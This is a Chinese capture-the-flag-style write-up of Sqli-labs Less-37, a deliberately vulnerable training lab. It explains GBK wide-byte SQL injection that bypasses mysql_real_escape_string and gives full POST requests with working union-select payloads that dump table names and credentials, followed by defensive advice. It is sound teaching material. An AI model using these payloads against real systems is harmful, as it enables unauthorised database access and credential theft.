# 题目：Sqli-labs Less-37

## 题目描述
页面为 Username / Password 登录框，采用 POST 方式提交数据。页面底部输出两条Hint：
```
Hint: The Username you input is escaped as : ...
Hint: The Password you input is escaped as : ...
```
标题为 `Less-37- MySQL_real_escape_string`。考点和 Less‑36 完全一致，只是请求方式从 GET 改为 POST，`uname`、`passwd` 两个参数均经过 `mysql_real_escape_string()` 转义处理。
> 重要提示：本题为POST表单注入，**不能直接在浏览器登录输入框填写payload**。浏览器表单会把`%DF%27`当成普通文本，不会解析为原始字节，宽字节无法触发。需要使用Burp Suite抓包，将payload写在请求体body中进行测试。

## 核心原理与前置分析
后台关键PHP源码：
```php
$uname  = mysql_real_escape_string($_POST['uname']);
$passwd = mysql_real_escape_string($_POST['passwd']);
mysql_query("SET NAMES gbk");
$sql = "SELECT username, password FROM users
        WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

漏洞成因依旧是**先执行转义，后设置 GBK 字符集**，转义阶段与 SQL 执行阶段数据库连接字符集不一致：
1. 调用`mysql_real_escape_string()`时还未切换 GBK，单引号`'`被转义为`0x5C 0x27`；
2. 后续执行`SET NAMES gbk`，MySQL 使用 GBK 解析 SQL 语句，`0xDF 0x5C`组合成为合法 GBK 汉字，反斜杠`0x5C`被消耗；
3. `0x27`单引号被释放，成功闭合原有 SQL 字符串，注入生效。

与 Less‑36 两点区别：
- 提交方式为 POST，参数放置在 HTTP 请求体，使用 Burp Repeater 测试；
- 查询语句返回只有**2 列**，union select 必须为两列，`group_concat`一般放在第 2 列，回显在密码位置。
> 补充：`uname`、`passwd`两个参数都做了同样转义，**两个位置都可以作为注入点**。

## 解题思路
1. Burp 抓包，将 POST 请求发送到 Repeater；在`uname`传入`%DF%27`，观察 Hint 回显确认宽字节逃逸效果；
2. 拼接`or 1=1`验证单引号逃逸成功；
3. 使用`union select 1,2`确定列数与回显位置；
4. 将`group_concat`放置在第二列，依次爆库、爆表、爆字段、导出账号密码；
5. 备选：`passwd`参数同样可以注入，uname 被限制时可以切换该参数。

## 解题步骤
### Burp 抓包准备
1. 开启 Burp 代理，浏览器代理设置为`127.0.0.1:8080`，开启 Proxy 拦截`Intercept is on`。
2. 访问 Less‑37 页面，登录框随意输入账号密码，点击`Submit`提交，数据包被 Burp 拦截。
3. 点击 `Action → Send to Repeater`，切换到 Repeater 面板，后续所有 payload 直接在此修改请求体 body，点击 Send 发送。

### 1. 确认宽字节逃逸
```
POST /sqli-labs/Less-37/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uname=%DF%27&passwd=1&submit=Submit
```

页面 Hint 回显：
```
The Username you input is escaped as : ß\'
```
可以看到`0xDF 0x5C`，反斜杠被 GBK 汉字吃掉，单引号成功逃逸。

### 2. 确认单引号逃逸，验证注入点
```
POST /sqli-labs/Less-37/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uname=%DF%27+or+1=1+%23&passwd=1&submit=Submit
```

页面回显正常用户数据：
```
Your Login name:Dumb
Your Password:Dumb
```

### 3. 判断列数并找回显位
```
POST /sqli-labs/Less-37/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uname=-1%DF%27+union+select+1,2+%23&passwd=1&submit=Submit
```

回显：
```
Your Login name:1
Your Password:2
```
一共**2 列**，第 1 列回显登录名，第 2 列回显密码。

### 4. 爆库名
```
POST /sqli-labs/Less-37/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uname=-1%DF%27+union+select+1,database()+%23&passwd=1&submit=Submit
```

回显：
```
Your Login name:1
Your Password:security
```

### 5. 爆表名
```
POST /sqli-labs/Less-37/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uname=-1%DF%27+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase()+%23&passwd=1&submit=Submit
```

回显：
```
Your Login name:1
Your Password:emails,referers,uagents,users
```

### 6. 爆字段名
```
POST /sqli-labs/Less-37/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uname=-1%DF%27+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_schema%3Ddatabase()+and+table_name%3D0x7573657273+%23&passwd=1&submit=Submit
```

回显：
```
Your Login name:1
Your Password:id,username,password
```

### 7. 爆账号密码
```
POST /sqli-labs/Less-37/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uname=-1%DF%27+union+select+1,group_concat(username,0x3a,password)+from+users+%23&passwd=1&submit=Submit
```

回显：
```
Your Login name:1
Your Password:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,...
```

### 8. passwd 参数注入（备选注入点）
`passwd`同样经过`mysql_real_escape_string()`，没有额外过滤，也可以作为注入点：

```
POST /sqli-labs/Less-37/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uname=1&passwd=%DF%27+or+1=1+%23&submit=Submit
```
payload `-1%DF%27 union select 1,2 #` 放入 passwd 参数同样可以拿到数据。

## 踩坑记录
1. **不要认为 POST 注入有特殊语法**。POST 与 GET 注入原理完全一致，区别仅参数存放于请求体；**不能直接网页输入框写 payload，必须 Burp 抓包修改 body 测试**。
2. union 查询必须匹配本关 2 列结构，`group_concat`放在第 2 列输出到密码回显位。
3. `%DF`必须被 URL 解码为原始字节，不能直接传递字面字符串`%df`，否则无法形成 GBK 汉字。
4. 漏洞关键点代码顺序：**先转义，后 SET NAMES gbk**；调换顺序，`mysql_real_escape_string`识别 GBK 多字节，该宽字节绕过失效。
5. POST 表单优先选择`#(%23)`注释；`--+`中的加号在表单提交容易被编码为`%2B`，导致注释失效。
6. Burp Repeater 中不要手动修改`Content‑Length`，工具会自动更新，手动修改会造成数据包异常。

## 知识点总结
1. POST 注入：参数在 HTTP 请求体，其余注入逻辑与 GET 注入无差别；POST 宽字节注入需要抓包发送编码后的字节。
2. `mysql_real_escape_string`失效条件：转义执行时数据库连接字符集，与 SQL 执行时字符集不统一；字符集设置必须放在转义函数调用之前。
3. 宽字节注入本质：GBK 编码下`0xDF 0x5C`组合为汉字，消耗转义添加的反斜杠，单引号逃逸闭合 SQL。
4. 本关查询返回两列，union select 列数必须等于原始查询列数；`uname`与`passwd`两个参数均可注入。

**防御**: 使用预编译 + 参数绑定；数据库统一使用 utf8mb4；避免使用`SET NAMES`手动修改字符集；`mysql_real_escape_string`必须在设置连接字符集之后调用，不可单独作为 SQL 注入防御手段。
